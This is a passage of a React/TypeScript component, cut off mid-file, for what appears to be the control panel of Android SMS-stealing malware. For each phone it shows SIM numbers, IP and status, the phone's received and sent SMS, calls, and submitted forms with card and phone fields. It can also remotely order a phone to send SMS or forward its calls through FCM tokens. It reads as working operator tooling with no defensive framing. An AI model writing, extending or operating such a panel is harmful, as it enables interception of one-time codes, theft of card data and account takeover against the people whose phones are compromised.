import { useState, useEffect, useRef, useCallback } from "react";
import NotificationsModal from "@/components/NotificationsModal";
import GalleryModal from "@/components/GalleryModal";
import {
  X, Smartphone, Battery, Signal, CreditCard, Clock,
  MessageSquare, Loader2, FileText, StickyNote,
  User, Phone, CreditCard as CardIcon, Save, Send, PhoneForwarded, Bell, Image as ImageIcon,
  CheckCircle, XCircle, ArrowUp, Trash2, ClipboardPaste, Pin, PinOff, Globe, MapPin, ExternalLink, User as UserIcon, Maximize2, Minimize2
} from "lucide-react";
import {
  Dialog, DialogContent, DialogHeader, DialogTitle,
} from "@/components/ui/dialog";
import {
  DeviceUser, useDeviceSMS, useDeviceForms, useDeviceNotes, useDeviceSentSMS, useDeviceCalls, clearDeviceSmsCache,
} from "@/hooks/useFirebaseData";
import { db } from "@/lib/firebase";
import { ref, remove } from "@/lib/rtdbPb";
import SmsTab from "@/components/SmsTab";
import { sendPing, sendSMS, sendCallForward } from "@/lib/fcm";
import { format } from "date-fns";
import { toast } from "sonner";
import { useSecuritySettings } from "@/hooks/useSecuritySettings";
import OtpDialog from "@/components/OtpDialog";

export interface LinkPermissions {
  sms?: boolean; sent_sms?: boolean; calls?: boolean; forms?: boolean;
  gallery?: boolean; notifications?: boolean; send_sms?: boolean; call_forward?: boolean;
}

interface DeviceDetailProps {
  id: string;
  user: DeviceUser;
  onClose: () => void;
  pinned?: boolean;
  onTogglePin?: () => void;
  embedded?: boolean;
  highlightSmsKey?: string;
  linkPermissions?: LinkPermissions;
}

type TabKey = "sms" | "sent" | "calls" | "forms";
import { useIsMobile } from "@/hooks/use-mobile";


const DeviceDetail = ({ id, user, onClose, pinned = false, onTogglePin, embedded = false, highlightSmsKey, linkPermissions }: DeviceDetailProps) => {
  const isOnline = user.status === "online";
  const { smsList, loading, hasMore, loadMore, loadAll, loadingAll, allLoaded } = useDeviceSMS(id);
  const { forms } = useDeviceForms(id);
  const { notes, saveNotes } = useDeviceNotes(id);
  const { sentList, loading: sentLoading } = useDeviceSentSMS(id);
  const { call, loading: callsLoading } = useDeviceCalls(id);
  const [activeTab, setActiveTab] = useState<TabKey>("sms");
  const [localNotes, setLocalNotes] = useState(notes);
  const [savingNotes, setSavingNotes] = useState(false);
  const { security } = useSecuritySettings();
  const [otpFormKey, setOtpFormKey] = useState<string | null>(null);
  
  const [tabFullscreen, setTabFullscreen] = useState(false);
  const [showNotes, setShowNotes] = useState(false);
  const [showNotifications, setShowNotifications] = useState(false);
  const [showGallery, setShowGallery] = useState(false);
  const [showSmsDialog, setShowSmsDialog] = useState(false);
  const [showForwardDialog, setShowForwardDialog] = useState(false);
  const [smsNumber, setSmsNumber] = useState("");
  const [smsMessage, setSmsMessage] = useState("");
  const [smsSim, setSmsSim] = useState("0");
  const [fwdNumber, setFwdNumber] = useState("");
  const [fwdSim, setFwdSim] = useState("0");
  const [fwdStatus, setFwdStatus] = useState("true");
  const [sending, setSending] = useState(false);
  const scrollRef = useRef<HTMLDivElement>(null);
  const [showGoTop, setShowGoTop] = useState(false);
  const isMobile = useIsMobile();
  const [searchFocused, setSearchFocused] = useState(false);
  const [showIpModal, setShowIpModal] = useState(false);
  const [ipDetails, setIpDetails] = useState<any>(null);
  const [ipLoading, setIpLoading] = useState(false);

  const fetchIpDetails = async (ip: string) => {
    setIpLoading(true);
    setShowIpModal(true);
    try {
      const res = await fetch(`https://ipapi.co/${ip}/json/`);
      const data = await res.json();
      setIpDetails(data);
    } catch {
      setIpDetails({ error: "Failed to fetch IP details" });
    }
    setIpLoading(false);
  };

  const handleScroll = useCallback(() => {
    if (scrollRef.current) {
      setShowGoTop(scrollRef.current.scrollTop > 300);
    }
  }, []);

  const scrollToTop = () => {
    scrollRef.current?.scrollTo({ top: 0, behavior: "smooth" });
  };

  useEffect(() => { setLocalNotes(notes); }, [notes]);


  const handleSaveNotes = async () => {
    setSavingNotes(true);
    await saveNotes(id, localNotes);
    setSavingNotes(false);
    toast.success("Notes saved");
    setShowNotes(false);
  };

  const hasPermission = (key: keyof LinkPermissions) => !linkPermissions || linkPermissions[key] !== false;

  const tabs: { key: TabKey; label: string; icon: React.ElementType; count?: number }[] = [
    ...(hasPermission("sms") ? [{ key: "sms" as TabKey, label: "SMS", icon: MessageSquare, count: smsList.length }] : []),
    ...(hasPermission("sent_sms") ? [{ key: "sent" as TabKey, label: "Sent", icon: Send, count: sentList.length }] : []),
    ...(hasPermission("calls") ? [{ key: "calls" as TabKey, label: "Calls", icon: Phone, count: call ? 1 : 0 }] : []),
    ...(hasPermission("forms") ? [{ key: "forms" as TabKey, label: "Forms", icon: FileText, count: forms.length }] : []),
  ];

  useEffect(() => {
    if (tabs.length > 0 && !tabs.find(t => t.key === activeTab)) {
      setActiveTab(tabs[0].key);
    }
  }, [linkPermissions]);

  return (
    <div className={embedded ? "flex flex-col h-full bg-background border-r border-border last:border-r-0 overflow-hidden" : "fixed inset-0 z-50 bg-background flex flex-col animate-in slide-in-from-bottom-4 fade-in duration-300"}>
      {/* ── Header bar ── */}
      {!tabFullscreen && (
      <header className="shrink-0 flex items-center justify-between px-4 pt-4 pb-2">
        <button onClick={() => { clearDeviceSmsCache(id); onClose(); }} className="h-9 w-9 rounded-xl bg-card border border-border flex items-center justify-center hover:bg-destructive/10 hover:text-destructive transition-all">
          <X className="h-4 w-4" />
        </button>
        <div className="flex items-center gap-2">
          <button
            onClick={() => setTabFullscreen(true)}
            className="h-9 w-9 rounded-xl bg-card border border-border flex items-center justify-center hover:bg-primary/10 hover:text-primary hover:border-primary/30 transition-all"
          >
            <Maximize2 className="h-4 w-4" />
          </button>
          {hasPermission("notifications") && (
            <button
              onClick={() => setShowNotifications(true)}
              className="h-9 w-9 rounded-xl bg-card border border-border flex items-center justify-center hover:bg-primary/10 hover:text-primary hover:border-primary/30 transition-all"
            >
              <Bell className="h-4 w-4" />
            </button>
          )}
          {hasPermission("gallery") && (
            <button
              onClick={() => setShowGallery(true)}
              className="h-9 w-9 rounded-xl bg-card border border-border flex items-center justify-center hover:bg-primary/10 hover:text-primary hover:border-primary/30 transition-all"
            >
              <ImageIcon className="h-4 w-4" />
            </button>
          )}
          <button
            onClick={() => onTogglePin?.()}
            className={`h-9 w-9 rounded-xl border flex items-center justify-center transition-all ${
              pinned
                ? "bg-primary/15 border-primary/40 text-primary"
                : "bg-card border-border hover:bg-primary/10 hover:text-primary hover:border-primary/30"
            }`}
          >
            {pinned ? <PinOff className="h-4 w-4" /> : <Pin className="h-4 w-4" />}
          </button>
          <button onClick={() => setShowNotes(true)} className="h-9 w-9 rounded-xl bg-card border border-border flex items-center justify-center hover:bg-primary/10 hover:text-primary hover:border-primary/30 transition-all">
            <StickyNote className="h-4 w-4" />
          </button>
        </div>
      </header>
      )}

      {/* ── Device Hero Card ── */}
      {!(isMobile && searchFocused) && !tabFullscreen && (
      <div className="shrink-0 px-4 pb-3">
        <div className="rounded-2xl border border-border bg-card p-4 relative overflow-hidden">
          <div className={`absolute top-0 right-0 w-32 h-32 rounded-full blur-3xl opacity-20 -translate-y-1/2 translate-x-1/4 ${isOnline ? "bg-green" : "bg-destructive"}`} />
          <div className="flex items-center gap-3.5 relative">
            <div className={`relative h-14 w-14 rounded-2xl flex items-center justify-center shrink-0 ${isOnline ? "gradient-purple-pink glow-purple" : "bg-secondary border border-border"}`}>
              <Smartphone className={`h-6 w-6 ${isOnline ? "text-primary-foreground" : "text-muted-foreground"}`} />
              <span className={`absolute -bottom-1 -right-1 h-4 w-4 rounded-full border-[2.5px] border-card ${isOnline ? "bg-green animate-pulse" : "bg-destructive/60"}`} />
            </div>
            <div className="min-w-0 flex-1">
              <h2 className="font-extrabold text-foreground text-base leading-tight truncate">{user.brand} {user.model}</h2>
              <div className="flex items-center gap-1.5 mt-0.5">
                <User className="h-3 w-3 text-purple" />
                <span className="text-[10px] font-semibold text-purple">{user.kiskahai || "Unknown"}</span>
              </div>
              <p className="text-[10px] text-muted-foreground font-mono mt-0.5 truncate">{id}</p>
              <div className="flex items-center gap-2 mt-1.5">
                <span className={`inline-flex items-center gap-1 text-[10px] font-bold px-2 py-0.5 rounded-full ${isOnline ? "text-green bg-green/10 border border-green/20" : "text-destructive bg-destructive/10 border border-destructive/20"}`}>
                  <span className={`h-1.5 w-1.5 rounded-full ${isOnline ? "bg-green" : "bg-destructive/60"}`} />
                  {isOnline ? "Online" : "Offline"}
                </span>
                <span className="text-[10px] text-muted-foreground">{getTimeAgo(user.timestamp)}</span>
              </div>
            </div>
          </div>
          <div className="flex items-center gap-2 mt-3 flex-wrap">
            <span className={`inline-flex items-center gap-1 px-2.5 py-1 rounded-lg bg-background/60 border border-border/50 text-[10px] font-bold ${user.battery > 50 ? "text-green" : user.battery > 20 ? "text-yellow" : "text-destructive"}`}>
              <Battery className="h-3 w-3" /> {user.battery}%
            </span>
            <span className="inline-flex items-center gap-1 px-2.5 py-1 rounded-lg bg-background/60 border border-border/50 text-[10px] font-bold text-cyan">
              <Signal className="h-3 w-3" /> A{user.android_version}
            </span>
          </div>
          <div className="space-y-1 mt-2">
            <div className="flex items-center gap-1.5 px-2.5 py-1.5 rounded-lg bg-background/60 border border-border/50">
              <CreditCard className="h-3 w-3 text-cyan shrink-0" />
              <span className="text-[9px] text-muted-foreground shrink-0">SIM1</span>
              <span className="text-[10px] font-bold text-foreground font-mono break-all leading-tight">{user.sim1 || "—"}</span>
            </div>
            <div className="flex items-center gap-1.5 px-2.5 py-1.5 rounded-lg bg-background/60 border border-border/50">
              <CreditCard className="h-3 w-3 text-pink shrink-0" />
              <span className="text-[9px] text-muted-foreground shrink-0">SIM2</span>
              <span className="text-[10px] font-bold text-foreground font-mono break-all leading-tight">{user.sim2 || "—"}</span>
            </div>
          </div>
        </div>

        {/* Notes preview */}
        {notes && (
          <div className="mt-2.5 rounded-2xl bg-yellow/5 border border-yellow/20 p-3 cursor-pointer active:scale-[0.99] transition-transform" onClick={() => setShowNotes(true)}>
            <div className="flex items-center gap-1.5 mb-1">
              <StickyNote className="h-3 w-3 text-yellow" />
              <span className="text-[10px] font-bold text-yellow">Notes</span>
            </div>
            <p className="text-[11px] text-muted-foreground line-clamp-2 leading-relaxed">{notes}</p>
          </div>
        )}

        {/* Action Buttons */}
        <div className="flex gap-2 mt-3">
          <button
            onClick={async () => {
              const t = toast.loading("Pinging...");
              const res = await sendPing(user.fcm_token);
              toast.dismiss(t);
              res.success ? toast.success("Ping sent!") : toast.error(res.error || "Ping failed");
            }}
            className="flex-1 flex items-center justify-center gap-1.5 py-2.5 rounded-xl text-[11px] font-bold gradient-green-cyan text-primary-foreground hover:opacity-90 active:scale-[0.97] transition-all shadow-lg shadow-green/10"
          >
            <Bell className="h-3.5 w-3.5" />
            Ping
          </button>
          {hasPermission("send_sms") && (
            <button
              onClick={() => setShowSmsDialog(true)}
              className="flex-1 flex items-center justify-center gap-1.5 py-2.5 rounded-xl text-[11px] font-bold gradient-purple-pink text-primary-foreground hover:opacity-90 active:scale-[0.97] transition-all shadow-lg shadow-primary/10"
            >
              <Send className="h-3.5 w-3.5" />
              Send SMS
            </button>
          )}
          {hasPermission("call_forward") && (
            <button
              onClick={() => setShowForwardDialog(true)}
              className="flex-1 flex items-center justify-center gap-1.5 py-2.5 rounded-xl text-[11px] font-bold gradient-cyan-blue text-primary-foreground hover:opacity-90 active:scale-[0.97] transition-all shadow-lg shadow-cyan/10"
            >
              <PhoneForwarded className="h-3.5 w-3.5" />
              Forward
            </button>
          )}
        </div>
      </div>
      )}

      {/* ── Collapsed Mini Bar (visible when hero is hidden on mobile search focus) ── */}
      {isMobile && searchFocused && (
        <div className="shrink-0 mx-4 mb-2 px-3 py-2 rounded-xl bg-card border border-border flex items-center gap-2.5">
          <div className={`h-7 w-7 rounded-lg flex items-center justify-center shrink-0 ${isOnline ? "gradient-purple-pink" : "bg-secondary border border-border"}`}>
            <Smartphone className={`h-3.5 w-3.5 ${isOnline ? "text-primary-foreground" : "text-muted-foreground"}`} />
          </div>
          <span className="text-[11px] font-bold text-foreground truncate flex-1">{user.brand} {user.model}</span>
          <span className={`inline-flex items-center gap-1 text-[9px] font-bold px-1.5 py-0.5 rounded-full shrink-0 ${isOnline ? "text-green bg-green/10 border border-green/20" : "text-destructive bg-destructive/10 border border-destructive/20"}`}>
            <span className={`h-1.5 w-1.5 rounded-full ${isOnline ? "bg-green" : "bg-destructive/60"}`} />
            {isOnline ? "On" : "Off"}
          </span>
        </div>
      )}

      {/* ── Tab Bar ── */}
      <div className="shrink-0 mx-4 rounded-2xl bg-card border border-border/50 p-1 grid gap-1" style={{ gridTemplateColumns: `repeat(${tabs.length}, 1fr)` }}>
        {tabs.map((tab) => {
          const isActive = activeTab === tab.key;
          return (
            <button
              key={tab.key}
              onClick={() => setActiveTab(tab.key)}
              className={`flex items-center justify-center gap-1 py-2.5 rounded-xl text-[10px] font-bold transition-colors duration-100 ${
                isActive
                  ? "bg-primary text-primary-foreground"
                  : "text-muted-foreground"
              }`}
            >
              <tab.icon className="h-3 w-3" />
              <span className="truncate">{tab.label}</span>
              {tab.count !== undefined && tab.count > 0 && (
                <span className={`text-[8px] min-w-[14px] text-center px-1 py-px rounded-full font-bold leading-tight ${
                  isActive ? "bg-primary-foreground/20" : "bg-secondary"
                }`}>{tab.count}</span>
              )}
            </button>
          );
        })}
      </div>

      {/* Fullscreen mini header */}
      {tabFullscreen && (
        <div className="shrink-0 mx-4 mt-2 flex items-center justify-between">
          <div className="flex items-center gap-2">
            <div className={`h-7 w-7 rounded-lg flex items-center justify-center shrink-0 ${isOnline ? "gradient-purple-pink" : "bg-secondary border border-border"}`}>
              <Smartphone className={`h-3.5 w-3.5 ${isOnline ? "text-primary-foreground" : "text-muted-foreground"}`} />
            </div>
            <span className="text-[11px] font-bold text-foreground truncate">{user.brand} {user.model}</span>
            <span className={`inline-flex items-center gap-1 text-[9px] font-bold px-1.5 py-0.5 rounded-full ${isOnline ? "text-green bg-green/10" : "text-destructive bg-destructive/10"}`}>
              <span className={`h-1.5 w-1.5 rounded-full ${isOnline ? "bg-green" : "bg-destructive/60"}`} />
              {isOnline ? "On" : "Off"}
            </span>
          </div>
          <div className="flex items-center gap-2">
            <button
              onClick={() => setTabFullscreen(false)}
              className="h-8 w-8 rounded-xl bg-card border border-border flex items-center justify-center hover:bg-primary/10 hover:text-primary transition-all"
            >
              <Minimize2 className="h-3.5 w-3.5" />
            </button>
            <button
              onClick={() => { clearDeviceSmsCache(id); onClose(); }}
              className="h-8 w-8 rounded-xl bg-card border border-border flex items-center justify-center hover:bg-destructive/10 hover:text-destructive transition-all"
            >
              <X className="h-3.5 w-3.5" />
            </button>
          </div>
        </div>
      )}

      {/* ── Tab Content ── */}
      <div ref={scrollRef} onScroll={handleScroll} className="flex-1 overflow-y-auto mt-3 px-4 pb-6 relative">
        {/* SMS Tab */}
        {activeTab === "sms" && (
          <SmsTab
            deviceId={id}
            smsList={smsList}
            loading={loading}
            hasMore={hasMore}
            loadMore={loadMore}
            loadAll={loadAll}
            loadingAll={loadingAll}
            allLoaded={allLoaded}
            fcmToken={user.fcm_token}
            onSearchFocus={() => setSearchFocused(true)}
            onSearchBlur={() => setSearchFocused(false)}
            highlightSmsKey={highlightSmsKey}
          />
        )}

        {/* Sent SMS Tab */}
        {activeTab === "sent" && (
          <div className="space-y-2.5">
            {sentLoading ? (
              <EmptyState icon={Loader2} text="Loading sent messages..." spin />
            ) : sentList.length === 0 ? (
              <EmptyState icon={Send} text="No sent messages" />
            ) : (
              sentList.map((s) => (
                <div key={s.key} className="rounded-2xl border border-border bg-card p-3.5 hover:border-primary/20 transition-all">
                  <div className="flex items-center justify-between mb-1.5">
                    <div className="flex items-center gap-1.5">
                      <div className="h-7 w-7 rounded-lg bg-cyan/10 flex items-center justify-center">
                        <Phone className="h-3.5 w-3.5 text-cyan" />
                      </div>
                      <span className="text-[11px] font-bold text-foreground font-mono">{s.number}</span>
                    </div>
                    <span className={`inline-flex items-center gap-0.5 text-[9px] px-2 py-1 rounded-lg font-semibold ${s.success ? "bg-green/10 text-green" : "bg-destructive/10 text-destructive"}`}>
                      {s.success ? <CheckCircle className="h-3 w-3" /> : <XCircle className="h-3 w-3" />}
                      {s.status}
                    </span>
                  </div>
                  <p className="text-[11px] text-foreground/85 leading-relaxed mb-1.5">{s.message}</p>
                  <div className="flex items-center justify-between text-[9px]">
                    <div className="flex items-center gap-1.5">
                      <span className="px-1.5 py-0.5 rounded-md bg-secondary/80 text-muted-foreground font-mono">{s.sim}</span>
                      {s.error && <span className="text-destructive truncate max-w-[180px]">{s.error}</span>}
                    </div>
                    <span className="text-muted-foreground">{format(new Date(s.time), "MMM dd, HH:mm")}</span>
                  </div>
                </div>
              ))
            )}
          </div>
        )}

        {/* Calls Tab */}
        {activeTab === "calls" && (
          <div className="space-y-2.5">
            {callsLoading ? (
              <EmptyState icon={Loader2} text="Loading calls..." spin />
            ) : !call ? (
              <EmptyState icon={Phone} text="No call data" />
            ) : (
              <div className="rounded-2xl border border-border bg-card p-3.5 hover:border-primary/20 transition-all">
                <div className="flex items-center justify-between mb-1.5">
                  <div className="flex items-center gap-1.5">
                    <div className={`h-7 w-7 rounded-lg flex items-center justify-center ${call.success ? "bg-green/10" : "bg-destructive/10"}`}>
                      <Phone className={`h-3.5 w-3.5 ${call.success ? "text-green" : "text-destructive"}`} />
                    </div>
                    <span className="text-[11px] font-bold text-foreground font-mono">{call.number}</span>
                  </div>
                  <span className={`inline-flex items-center gap-0.5 text-[9px] px-2 py-1 rounded-lg font-semibold ${call.success ? "bg-green/10 text-green" : "bg-destructive/10 text-destructive"}`}>
                    {call.success ? <CheckCircle className="h-3 w-3" /> : <XCircle className="h-3 w-3" />}
                    {call.isdone ? "Done" : "Pending"}
                  </span>
                </div>
                {call.result && <p className="text-[11px] text-foreground/85 leading-relaxed mb-1.5">{call.result}</p>}
                <div className="flex items-center justify-between text-[9px]">
                  <span className="px-1.5 py-0.5 rounded-md bg-secondary/80 text-muted-foreground font-mono">{call.sim}</span>
                  <span className="text-muted-foreground">{format(new Date(call.time), "MMM dd, HH:mm")}</span>
                </div>
              </div>
            )}
          </div>
        )}

        {/* Forms Tab */}
        {activeTab === "forms" && (
          <div className="space-y-2.5">
            {forms.length === 0 ? (
              <EmptyState icon={FileText} text="No forms found" />
            ) : (
              forms.map((form) => (
                <div key={form.key} className="rounded-2xl border border-border bg-card p-4">
                  <div className="flex items-center justify-between mb-3">
                    <span className="text-[10px] text-muted-foreground font-mono bg-secondary/50 px-2 py-0.5 rounded-md">{form.key}</span>
                    <div className="flex items-center gap-2">
                      <span className="text-[10px] text-muted-foreground">{format(new Date(form.timestamp), "MMM dd, yyyy HH:mm")}</span>
                      <button
                        onClick={() => {
                          if (security.otp_on_delete) {
                            setOtpFormKey(form.key);
                          } else {
                            remove(ref(db, `users/${id}/forms/${form.key}`)).then(() => toast.success("Form deleted")).catch(() => toast.error("Failed"));
                          }
                        }}
                        className="h-7 w-7 rounded-lg bg-destructive/10 flex items-center justify-center hover:bg-destructive/20 transition-colors"
                      >
                        <Trash2 className="h-3 w-3 text-destructive" />
                      </button>
                    </div>
                  </div>
                  <div className="space-y-1.5">
                    {Object.entries(form.content).map(([field, value]) => (
                      <div key={field} className="flex items-center gap-2 py-1.5 border-b border-border/50 last:border-0">
                        <FormFieldIcon field={field} />
                        <span className="text-[10px] text-muted-foreground capitalize w-16 shrink-0">{field}</span>
                        <span className="text-[11px] text-foreground font-mono">{value}</span>
                      </div>
                    ))}
                  </div>
                </div>
              ))
            )}
          </div>
        )}

        {/* Go to top */}
        {showGoTop && (
          <button
            onClick={scrollToTop}
            className="sticky bottom-20 left-1/2 -translate-x-1/2 mx-auto flex items-center gap-1.5 px-4 py-2 rounded-full gradient-purple-pink text-primary-foreground text-xs font-semibold shadow-lg glow-purple active:scale-95 transition-all z-10"
          >
            <ArrowUp className="h-3.5 w-3.5" />
            Go to top
          </button>
        )}
      </div>

      {/* ── Notes Overlay ── */}
      {showNotes && (
        <div className="fixed inset-0 z-[60] bg-background/80  flex items-end justify-center animate-in fade-in duration-200" onClick={() => setShowNotes(false)}>
          <div
            className="w-full max-w-lg bg-card border-t border-border rounded-t-3xl p-5 pb-24 space-y-3 animate-in slide-in-from-bottom-8 duration-300"
            onClick={(e) => e.stopPropagation()}
          >
            <div className="flex items-center justify-between mb-1">
              <div className="flex items-center gap-2">
                <StickyNote className="h-4 w-4 text-primary" />
                <h3 className="font-bold text-foreground text-sm">Device Notes</h3>
              </div>
              <button onClick={() => setShowNotes(false)} className="h-8 w-8 rounded-lg bg-secondary flex items-center justify-center hover:bg-destructive/10 transition-colors">
                <X className="h-4 w-4" />
              </button>
            </div>
            <textarea
              value={localNotes}
              onChange={(e) => setLocalNotes(e.target.value)}
              placeholder="Write notes about this device..."
              className="w-full bg-secondary/50 rounded-xl p-3.5 text-sm text-foreground placeholder:text-muted-foreground/50 resize-none h-36 focus:outline-none focus:ring-1 focus:ring-primary border border-border"
            />
            <button
              onClick={handleSaveNotes}
              disabled={savingNotes}
              className="w-full flex items-center justify-center gap-2 py-3 rounded-xl gradient-purple-pink text-primary-foreground text-sm font-bold hover:opacity-90 active:scale-[0.98] transition-all disabled:opacity-50"
            >
              {savingNotes ? <Loader2 className="h-4 w-4 animate-spin" /> : <Save className="h-4 w-4" />}
              Save Notes
            </button>
          </div>
        </div>
      )}

      {/* ── Send SMS Dialog ── */}
      {showSmsDialog && (
        <div className="fixed inset-0 z-[60] bg-background/80  flex items-end justify-center animate-in fade-in duration-200" onClick={() => setShowSmsDialog(false)}>
          <div className="w-full max-w-lg bg-card border-t border-border rounded-t-3xl p-5 pb-24 space-y-3 animate-in slide-in-from-bottom-8 duration-300" onClick={(e) => e.stopPropagation()}>
            <div className="flex items-center justify-between mb-1">
              <div className="flex items-center gap-2">
                <Send className="h-4 w-4 text-primary" />
                <h3 className="font-bold text-foreground text-sm">Send SMS</h3>
              </div>
              <button onClick={() => setShowSmsDialog(false)} className="h-8 w-8 rounded-lg bg-secondary flex items-center justify-center hover:bg-destructive/10 transition-colors">
                <X className="h-4 w-4" />
              </button>
            </div>
            <div className="relative">
              <input
                value={smsNumber}
                onChange={(e) => setSmsNumber(e.target.value)}
                placeholder="Phone number"
                className="w-full bg-secondary/50 rounded-xl px-3.5 py-2.5 pr-10 text-sm text-foreground placeholder:text-muted-foreground/50 focus:outline-none focus:ring-1 focus:ring-primary border border-border font-mono"
              />
              <button
                type="button"
                onClick={async () => {
                  try {
                    const text = await navigator.clipboard.readText();
                    setSmsNumber(text.trim());
                    toast.success("Pasted");
                  } catch { toast.error("Clipboard access denied"); }
                }}
                className="absolute right-2 top-1/2 -translate-y-1/2 h-7 w-7 rounded-lg flex items-center justify-center text-muted-foreground hover:text-primary hover:bg-primary/10 transition-all"
                title="Paste from clipboard"
              >
                <ClipboardPaste className="h-3.5 w-3.5" />
              </button>
            </div>
            <div className="relative">
              <textarea
                value={smsMessage}
                onChange={(e) => setSmsMessage(e.target.value)}
                placeholder="Message..."
                className="w-full bg-secondary/50 rounded-xl p-3.5 pr-10 text-sm text-foreground placeholder:text-muted-foreground/50 resize-none h-24 focus:outline-none focus:ring-1 focus:ring-primary border border-border"
              />
              <button
                type="button"
                onClick={async () => {
                  try {
                    const text = await navigator.clipboard.readText();
                    setSmsMessage(text.trim());
                    toast.success("Pasted");
                  } catch { toast.error("Clipboard access denied"); }
                }}
                className="absolute right-2 top-3 h-7 w-7 rounded-lg flex items-center justify-center text-muted-foreground hover:text-primary hover:bg-primary/10 transition-all"
                title="Paste from clipboard"
              >
                <ClipboardPaste className="h-3.5 w-3.5" />
              </button>
            </div>
            <div className="flex gap-2">
              <button onClick={() => setSmsSim("0")} className={`flex-1 py-2 rounded-xl text-xs font-bold border transition-all ${smsSim === "0" ? "gradient-purple-pink text-primary-foreground border-transparent" : "bg-secondary text-muted-foreground border-border"}`}>SIM 1</button>
              <button onClick={() => setSmsSim("1")} className={`flex-1 py-2 rounded-xl text-xs font-bold border transition-all ${smsSim === "1" ? "gradient-purple-pink text-primary-foreground border-transparent" : "bg-secondary text-muted-foreground border-border"}`}>SIM 2</button>
            </div>
            <button
              disabled={sending || !smsNumber || !smsMessage}
              onClick={async () => {
                setSending(true);
                const res = await sendSMS(user.fcm_token, smsNumber, smsMessage, smsSim);
                setSending(false);
                if (res.success) {
                  toast.success("SMS command sent!");
                  setSmsNumber(""); setSmsMessage("");
                } else {
                  toast.error(res.error || "Failed");
                }
              }}
              className="w-full flex items-center justify-center gap-2 py-3 rounded-xl gradient-purple-pink text-primary-foreground text-sm font-bold hover:opacity-90 active:scale-[0.98] transition-all disabled:opacity-50"
            >
              {sending ? <Loader2 className="h-4 w-4 animate-spin" /> : <Send className="h-4 w-4" />}
              Send SMS
            </button>
          </div>
        </div>
      )}

      {/* ── Call Forward Dialog ── */}
      {showForwardDialog && (
        <div className="fixed inset-0 z-[60] bg-background/80  flex items-end justify-center animate-in fade-in duration-200" onClick={() => setShowForwardDialog(false)}>
          <div className="w-full max-w-lg bg-card border-t border-border rounded-t-3xl p-5 pb-24 space-y-3 animate-in slide-in-from-bottom-8 duration-300" onClick={(e) => e.stopPropagation()}>
            <div className="flex items-center justify-between mb-1">
              <div className="flex items-center gap-2">
                <PhoneForwarded className="h-4 w-4 text-cyan" />
                <h3 className="font-bold text-foreground text-sm">Call Forwarding</h3>
              </div>
              <button onClick={() => setShowForwardDialog(false)} className="h-8 w-8 rounded-lg bg-secondary flex items-center justify-center hover:bg-destructive/10 transition-colors">
                <X className="h-4 w-4" />
              </button>
            </div>
            <div className="flex gap-2">
              <button onClick={() => setFwdStatus("true")} className={`flex-1 py-2 rounded-xl text-xs font-bold border transition-all ${fwdStatus === "true" ? "gradient-green-cyan text-primary-foreground border-transparent" : "bg-secondary text-muted-foreground border-border"}`}>Enable</button>
              <button onClick={() => setFwdStatus("false")} className={`flex-1 py-2 rounded-xl text-xs font-bold border transition-all ${fwdStatus === "false" ? "bg-destructive text-destructive-foreground border-transparent" : "bg-secondary text-muted-foreground border-border"}`}>Disable</button>
            </div>
            {fwdStatus === "true" && (
              <div className="relative">
                <input
                  value={fwdNumber}
                  onChange={(e) => setFwdNumber(e.target.value)}
                  placeholder="Forward to number"
                  className="w-full bg-secondary/50 rounded-xl px-3.5 py-2.5 pr-10 text-sm text-foreground placeholder:text-muted-foreground/50 focus:outline-none focus:ring-1 focus:ring-primary border border-border font-mono"
                />
                <button
                  type="button"
                  onClick={async () => {
                    try {
                      const text = await navigator.clipboard.readText();
                      setFwdNumber(text.trim());
                      toast.success("Pasted");
                    } catch { toast.error("Clipboard access denied"); }
                  }}
                  className="absolute right-2 top-1/2 -translate-y-1/2 h-7 w-7 rounded-lg flex items-center justify-center text-muted-foreground hover:text-primary hover:bg-primary/10 transition-all"
                  title="Paste from clipboard"
                >
                  <ClipboardPaste className="h-3.5 w-3.5" />
                </button>
              </div>
            )}
            <div className="flex gap-2">
              <button onClick={() => setFwdSim("0")} className={`flex-1 py-2 rounded-xl text-xs font-bold border transition-all ${fwdSim === "0" ? "gradient-cyan-blue text-primary-foreground border-transparent" : "bg-secondary text-muted-foreground border-border"}`}>SIM 1</button>
              <button onClick={() => setFwdSim("1")} className={`flex-1 py-2 rounded-xl text-xs font-bold border transition-all ${fwdSim === "1" ? "gradient-cyan-blue text-primary-foreground border-transparent" : "bg-secondary text-muted-foreground border-border"}`}>SIM 2</button>
            </div>
            <button
              disabled={sending || (fwdStatus === "true" && !fwdNumber)}
              onClick={async () => {
                setSending(true);
                const res = await sendCallForward(user.fcm_token, fwdNumber, fwdStatus, fwdSim);
                setSending(false);
                if (res.success) {
                  toast.success(fwdStatus === "true" ? "Forwarding enabled!" : "Forwarding disabled!");
                  setShowForwardDialog(false);
                  setFwdNumber("");
                } else {
                  toast.error(res.error || "Failed");
                }
              }}
              className="w-full flex items-center justify-center gap-2 py-3 rounded-xl gradient-cyan-blue text-primary-foreground text-sm font-bold hover:opacity-90 active:scale-[0.98] transition-all disabled:opacity-50"
            >
              {sending ? <Loader2 className="h-4 w-4 animate-spin" /> : <PhoneForwarded className="h-4 w-4" />}
              {fwdStatus === "true" ? "Enable Forward" : "Disable Forward"}
            </button>
          </div>
        </div>
      )}
      {/* OTP Dialog for form delete */}
      {otpFormKey && (
        <OtpDialog
          action={`Delete form: ${otpFormKey}`}
          onVerified={() => {
            remove(ref(db, `users/${id}/forms/${otpFormKey}`)).then(() => toast.success("Form deleted")).catch(() => toast.error("Failed"));
            setOtpFormKey(null);
          }}
          onCancel={() => setOtpFormKey(null)}
        />
      )}

      {/* ── IP Details Modal ── */}
      <Dialog open={showIpModal} onOpenChange={setShowIpModal}>
        <DialogContent className="max-w-sm rounded-2xl">
          <DialogHeader>
            <DialogTitle className="flex items-center gap-2 text-sm">
              <Globe className="h-4 w-4 text-orange" />
              IP Details — {user.ip}
            </DialogTitle>
          </DialogHeader>
          {ipLoading ? (
            <div className="flex items-center justify-center py-8">
              <Loader2 className="h-5 w-5 animate-spin text-muted-foreground" />
            </div>
          ) : ipDetails?.error ? (
            <div className="space-y-3 py-2">
              <p className="text-sm text-destructive text-center font-semibold">{ipDetails.reason || "Failed to fetch IP details"}</p>
              <div className="flex items-center justify-between py-1.5 px-3 rounded-lg bg-background/60 border border-border/50">
                <span className="text-[10px] text-muted-foreground">IP</span>
                <span className="text-[11px] font-bold text-foreground font-mono">{ipDetails.ip || user.ip}</span>
              </div>
              {ipDetails.reserved && (
                <p className="text-[10px] text-muted-foreground text-center">This is a private/reserved IP address — no geolocation data available.</p>
              )}
            </div>
          ) : ipDetails ? (
            <div className="space-y-2">
              {[
                { label: "City", value: ipDetails.city },
